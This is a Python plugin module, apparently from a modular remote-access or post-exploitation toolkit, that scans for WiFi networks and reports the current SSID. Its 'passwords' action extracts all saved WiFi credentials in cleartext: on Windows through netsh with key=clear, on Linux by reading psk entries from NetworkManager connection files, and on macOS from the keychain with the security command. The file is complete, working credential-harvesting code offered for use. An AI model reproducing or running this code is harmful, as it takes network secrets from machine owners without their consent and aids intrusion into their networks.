NAME = "wifi"
VERSION = "1.0.0"
DESCRIPTION = "WiFi network scan and saved credential extraction."
AUTHOR = "lucy"
DEPENDENCIES = []
OS_COMPAT = ["windows", "linux", "darwin"]


import platform
import re
import subprocess


class ModuleError(Exception):
    pass


def run(action: str, params: dict) -> dict:
    if action == "scan":
        return _scan()
    elif action == "passwords":
        return _dump_passwords()
    elif action == "current":
        return _current_network()
    return {"status": "failed", "data": None, "error": f"Unknown action: {action}"}


def _scan() -> dict:
    system = platform.system()
    networks = []
    try:
        if system == "Windows":
            out = subprocess.check_output(["netsh", "wlan", "show", "networks", "mode=bssid"], text=True, timeout=15, errors="replace")
            blocks = out.split("SSID ")
            for block in blocks[1:]:
                lines = block.strip().splitlines()
                ssid = lines[0].split(":", 1)[-1].strip() if lines else ""
                signal = ""
                for line in lines:
                    if "Signal" in line:
                        signal = line.split(":", 1)[-1].strip()
                networks.append({"ssid": ssid, "signal": signal})

        elif system == "Darwin":
            scan_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
            out = subprocess.check_output([scan_path, "-s"], text=True, timeout=15, errors="replace")
            for line in out.strip().splitlines()[1:]:
                parts = line.split()
                if parts:
                    networks.append({"ssid": parts[0], "signal": parts[2] if len(parts) > 2 else ""})

        else:
            out = subprocess.check_output(["nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY", "dev", "wifi"], text=True, timeout=15, errors="replace")
            for line in out.strip().splitlines():
                parts = line.split(":")
                if len(parts) >= 2:
                    networks.append({"ssid": parts[0], "signal": parts[1], "security": parts[2] if len(parts) > 2 else ""})

    except Exception as exc:
        return {"status": "failed", "data": None, "error": str(exc)}

    return {"status": "completed", "data": {"networks": networks, "count": len(networks)}}


def _dump_passwords() -> dict:
    system = platform.system()
    credentials = []

    if system == "Windows":
        try:
            out = subprocess.check_output(["netsh", "wlan", "show", "profiles"], text=True, timeout=10, errors="replace")
            ssids = re.findall(r"All User Profile\s*:\s*(.+)", out)
            for ssid in ssids:
                ssid = ssid.strip()
                try:
                    detail = subprocess.check_output(
                        ["netsh", "wlan", "show", "profile", ssid, "key=clear"],
                        text=True, timeout=5, errors="replace"
                    )
                    password_match = re.search(r"Key Content\s*:\s*(.+)", detail)
                    password = password_match.group(1).strip() if password_match else ""
                    credentials.append({"ssid": ssid, "password": password})
                except Exception:
                    credentials.append({"ssid": ssid, "password": "[error]"})
        except Exception as exc:
            return {"status": "failed", "data": None, "error": str(exc)}

    elif system == "Linux":
        import glob, os
        for path in glob.glob("/etc/NetworkManager/system-connections/*"):
            try:
                with open(path, "r") as f:
                    content = f.read()
                ssid_m = re.search(r"ssid=(.+)", content)
                pwd_m = re.search(r"psk=(.+)", content)
                if ssid_m:
                    credentials.append({
                        "ssid": ssid_m.group(1).strip(),
                        "password": pwd_m.group(1).strip() if pwd_m else "",
                    })
            except Exception:
                pass

    elif system == "Darwin":
        try:
            out = subprocess.check_output(
                ["networksetup", "-listpreferredwirelessnetworks", "en0"],
                text=True, timeout=10, errors="replace",
            )
            for line in out.strip().splitlines()[1:]:
                ssid = line.strip()
                try:
                    pwd_out = subprocess.check_output(
                        ["security", "find-generic-password", "-D", "AirPort network password", "-a", ssid, "-w"],
                        text=True, timeout=5, stderr=subprocess.DEVNULL,
                    )
                    credentials.append({"ssid": ssid, "password": pwd_out.strip()})
                except Exception:
                    credentials.append({"ssid": ssid, "password": "[keychain-denied]"})
        except Exception as exc:
            return {"status": "failed", "data": None, "error": str(exc)}

    return {"status": "completed", "data": {"credentials": credentials, "count": len(credentials)}}


def _current_network() -> dict:
    system = platform.system()
    try:
        if system == "Windows":
            out = subprocess.check_output(["netsh", "wlan", "show", "interfaces"], text=True, timeout=5, errors="replace")
            ssid_m = re.search(r"SSID\s*:\s*(.+)", out)
            return {"status": "completed", "data": {"ssid": ssid_m.group(1).strip() if ssid_m else "disconnected"}}
        elif system == "Darwin":
            out = subprocess.check_output(["networksetup", "-getairportnetwork", "en0"], text=True, timeout=5, errors="replace")
            return {"status": "completed", "data": {"ssid": out.split(":")[-1].strip()}}
        else:
            out = subprocess.check_output(["iwgetid", "-r"], text=True, timeout=5, errors="replace")
            return {"status": "completed", "data": {"ssid": out.strip()}}
    except Exception as exc:
        return {"status": "failed", "data": None, "error": str(exc)}
